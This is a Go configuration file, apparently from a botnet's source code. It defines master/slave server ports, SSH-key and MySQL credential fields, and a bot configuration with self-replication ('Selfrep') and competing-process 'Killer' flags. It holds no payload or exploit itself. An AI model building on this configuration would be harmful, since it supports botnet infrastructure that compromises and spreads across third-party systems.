package config

import (
	"github.com/charmbracelet/log"
	"os"
	"time"
)

var Server serverConfig
var Slave = &BotConfig{
	ServerAddress:  "localhost:69",
	SingleInstance: "",
	Selfrep:        false,
	Killer:         true,
}

var (
	Logger = log.NewWithOptions(os.Stderr, log.Options{
		ReportCaller:    true,
		ReportTimestamp: true,
		TimeFormat:      time.Kitchen,
	})
)

type serverConfig struct {
	MasterPort    int    `json:"master_port"`
	SlavePort     int    `json:"slave_port"`
	SshKey        string `json:"ssh_key"`
	MysqlAddress  string `json:"mysql_address"`
	MysqlUser     string `json:"mysql_user"`
	MysqlPassword string `json:"mysql_password"`
	MysqlDatabase string `json:"mysql_database"`
}

type BotConfig struct {
	ServerAddress  string
	SingleInstance string
	Selfrep        bool
	Killer         bool
}
